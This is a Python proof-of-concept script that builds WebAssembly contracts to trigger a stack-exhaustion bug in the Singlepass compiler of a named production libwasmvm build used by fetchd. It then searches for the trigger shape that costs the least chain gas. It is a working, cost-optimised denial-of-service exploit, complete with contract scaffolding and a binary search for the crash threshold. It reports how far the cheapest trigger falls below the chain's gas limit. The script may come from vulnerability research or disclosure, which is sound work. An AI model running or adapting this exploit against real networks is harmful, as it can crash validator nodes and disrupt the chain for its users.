#!/usr/bin/env python3
"""
Minimum-cost trigger search for the Singlepass "implicit else" stack exhaustion.

Everything is measured on the production artifact (libwasmvm.x86_64.so of
priv_wasmvm_sec v3.0.8-rc.3, the exact .so fetchd ships).

Model (derived from the upstream sources, wasmer v7.4.2):

  * `Operator::If` with a block type that has parameters runs
    `allocate_return_slots_and_swap(param_types.len() + 1, return_types.len())`.
    For a `(param i64) (result i64)` block that emits an extra `sub rsp, 8`.
  * `Operator::End` releases the slots of `value_stack[value_stack_depth_after()..]`
    with a single `add rsp, N`, and that instruction is emitted *before*
    `label_else`.  The false branch jumps straight to `label_else`, so it
    skips the `add rsp, N`: every execution of a *false* `if` with a spilled
    block parameter leaks 8 bytes of the 1 MiB dedicated Singlepass stack.
  * The leak only happens when the block parameter lives in memory, i.e. when
    at least 4 values are live below it (4 callee-saved registers are
    available), which is the "prefix >= 4" condition of the upstream matrix.

So one 8-byte leak costs one `if` + one `end` (both "accounting" operators at
14 x 115 = 1610 gas points) plus the operands.  The dedicated stack is 1 MiB,
so ~131072 leaks are needed.  This script searches for the cheapest shape that
reaches that threshold and reports the cost in *chain* units (SDK gas), which
is what actually decides reachability:

    wasmd DefaultGasMultiplier = 140000  (CosmWasm gas points per SDK gas)
"""
import os
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import run_poc as R                                     # noqa: E402
from wasm_builder import (                              # noqa: E402
    Module, I32, I64, op_i32_const, op_i64_const, op_nop, op_end, op_if,
    op_drop, op_local_get, op_local_set, op_local_tee, op_i32_sub, op_loop,
    op_br, op_br_if, op_call, op_i32_store, op_i32_add,
    op_global_get, op_global_set,
)

MULT = 140_000            # wasmd: CosmWasm gas points -> SDK gas
RESP = b'{"ok":{"messages":[],"attributes":[],"events":[],"data":null}}'
BIG = 1 << 62


# ---------------------------------------------------------------------------
# body builders: each returns (body_bytes, iterations_per_gas_unit)
# ---------------------------------------------------------------------------


def _pushes(n):
    """n live i64 values (local 0)."""
    return op_local_get(0) * n


def body_canon(iters, t_pass):
    """Upstream regression-test shape (baseline)."""
    b = bytearray()
    b += op_i32_const(iters) + op_local_set(1)
    b += op_loop()
    b += _pushes(5)                     # 4 prefix + 1 block parameter
    b += op_local_get(2)                # condition (false)
    b += op_if(t_pass) + op_end()       # implicit else
    b += op_drop() * 5
    b += op_local_get(1) + op_i32_const(1) + op_i32_sub() + op_local_tee(1) + op_br_if(0)
    b += op_end()
    return bytes(b)


def body_lean(iters, t_pass):
    """Same leak, no probe call, no check block, no host traffic."""
    b = bytearray()
    b += op_i32_const(iters) + op_local_set(1)
    b += op_loop()
    b += _pushes(5)
    b += op_i32_const(0)                # condition always false
    b += op_if(t_pass) + op_end()
    b += op_drop() * 5
    b += op_local_get(1) + op_i32_const(1) + op_i32_sub() + op_local_tee(1) + op_br_if(0)
    b += op_end()
    return bytes(b)


def body_infinite(t_pass):
    """Unbounded loop: the stack blows up before any counter is needed."""
    b = bytearray()
    b += op_loop()
    b += _pushes(5)
    b += op_i32_const(0)
    b += op_if(t_pass) + op_end()
    b += op_drop() * 5
    b += op_br(0)
    b += op_end()
    return bytes(b)


def body_unroll(iters, t_pass, u):
    """u leaks per loop iteration; the prefix values are re-pushed each time
    but the loop control overhead is amortised over u leaks."""
    b = bytearray()
    b += op_i32_const(iters) + op_local_set(1)
    b += op_loop()
    for _ in range(u):
        b += _pushes(5)
        b += op_i32_const(0)
        b += op_if(t_pass) + op_end()
        b += op_drop() * 5
    b += op_local_get(1) + op_i32_const(1) + op_i32_sub() + op_local_tee(1) + op_br_if(0)
    b += op_end()
    return bytes(b)


def body_chain(iters, t_pass):
    """The result of the `if` is reused as the parameter of the next one, so
    only one value has to be dropped per iteration."""
    b = bytearray()
    b += op_i32_const(iters) + op_local_set(1)
    b += op_loop()
    b += _pushes(4)                     # 4 live values below the parameter
    b += op_i32_const(0)
    b += op_if(t_pass) + op_end()       # result -> becomes next parameter
    b += op_drop() * 4                  # drop the 4 prefix values
    b += op_local_get(1) + op_i32_const(1) + op_i32_sub() + op_local_tee(1) + op_br_if(0)
    b += op_end()
    return bytes(b)


SHAPES = {
    "canon":   lambda it, tp: body_canon(it, tp),
    "lean":    lambda it, tp: body_lean(it, tp),
    "chain":   lambda it, tp: body_chain(it, tp),
    "unroll4": lambda it, tp: body_unroll(it, tp, 4),
    "unroll16": lambda it, tp: body_unroll(it, tp, 16),
    "unroll64": lambda it, tp: body_unroll(it, tp, 64),
    "infinite": lambda it, tp: body_infinite(tp),
}


def build(shape, iters):
    m = Module()
    m.add_memory(2, export="memory")
    t_pass = m.add_type([I64], [I64])
    m.add_data(16, (64).to_bytes(4, "little") + len(RESP).to_bytes(4, "little")
               + len(RESP).to_bytes(4, "little"))
    m.add_data(64, RESP)
    # locals of the trigger function: 0 = i64 payload, 1 = i32 counter, 2 = i32 cond
    body = SHAPES[shape](iters, t_pass)
    fn = m.add_func([], [], locals=[I64, I32, I32], body=body)
    exec_body = op_call(fn) + op_i32_const(16)
    m.add_func([I32, I32, I32], [I32], body=exec_body, export="execute")
    m.add_func([I32, I32, I32], [I32], body=op_i32_const(16), export="instantiate")
    m.add_func([], [], body=op_nop(), export="interface_version_8")
    # minimal but valid allocate/deallocate pair
    g_bump = m.add_global(I32, True, op_i32_const(1024))
    g_region = m.add_global(I32, True, op_i32_const(128))
    alloc_body = (
        op_global_get(g_region) + op_local_set(1)
        + op_local_get(1) + op_global_get(g_bump) + op_i32_store()
        + op_local_get(1) + op_i32_const(4) + op_i32_add() + op_local_get(0) + op_i32_store()
        + op_local_get(1) + op_i32_const(8) + op_i32_add() + op_i32_const(0) + op_i32_store()
        + op_global_get(g_bump) + op_local_get(0) + op_i32_add() + op_global_set(g_bump)
        + op_global_get(g_region) + op_i32_const(12) + op_i32_add() + op_global_set(g_region)
        + op_local_get(1)
    )
    m.add_func([I32], [I32], locals=[I32], body=alloc_body, export="allocate")
    m.add_func([I32], [], body=op_nop(), export="deallocate")
    return m.build()


def run(wasm, gas_limit=BIG):
    base = tempfile.mkdtemp()
    vm = R.VM()
    cache = vm.init_cache(base)
    checksum = vm.store_code(cache, wasm, checked=True)
    vm.instantiate(cache, checksum, gas_limit)
    res, rep, err = vm.execute(cache, checksum, gas_limit)
    return R.VM._vec_str(err), rep.used_internally


def classify(err):
    if "call stack exhausted" in err:
        return "STACK-EXH"
    if not err:
        return "ok"
    return err.split("\n")[0][:40]


def main():
    print("Coste por iteración y umbral, en puntos de CosmWasm y en gas de SDK")
    print("=" * 78)
    print("%-10s %12s %12s %10s %14s" %
          ("shape", "gas/iter", "sdk/iter", "leak/iter", "coste total SDK"))
    print("-" * 78)

    results = {}
    for shape in SHAPES:
        # 1) marginal cost: two runs that differ by 1000 iterations
        try:
            _, g1 = run(build(shape, 1000))
            _, g2 = run(build(shape, 2000))
        except Exception as exc:                       # noqa: BLE001
            print("%-10s  ERROR %s" % (shape, exc))
            continue
        per_iter = (g2 - g1) / 1000.0

        # 2) threshold: smallest iteration count that exhausts the stack
        lo, hi = 1, 400000
        try:
            err_hi, _ = run(build(shape, hi))
            if classify(err_hi) != "STACK-EXH":
                print("%-10s  no exhausta la pila (err=%s)" % (shape, classify(err_hi)))
                continue
        except Exception as exc:                       # noqa: BLE001
            print("%-10s  ERROR %s" % (shape, exc))
            continue
        while lo < hi:
            mid = (lo + hi) // 2
            err, _ = run(build(shape, mid))
            if classify(err) == "STACK-EXH":
                hi = mid
            else:
                lo = mid + 1
        thresh = lo

        # 3) leak per iteration = 1 MiB / threshold
        leak = 1048576.0 / thresh
        total_pts = per_iter * thresh
        total_sdk = total_pts / MULT
        results[shape] = (per_iter, leak, thresh, total_sdk)
        print("%-10s %12.1f %12.5f %10.2f %14.1f" %
              (shape, per_iter, per_iter / MULT, leak, total_sdk))

    print()
    if results:
        best = min(results.items(), key=lambda kv: kv[1][3])
        per_iter, leak, thresh, total_sdk = best[1]
        print("MEJOR: %s  ->  %d iteraciones, %.1f puntos/iter, %.0f gas de SDK"
              % (best[0], thresh, per_iter, total_sdk))
        print("        (frente a max_gas = 2 000 000 de la cadena -> %.0fx de holgura)"
              % (2000000.0 / total_sdk))


if __name__ == "__main__":
    main()
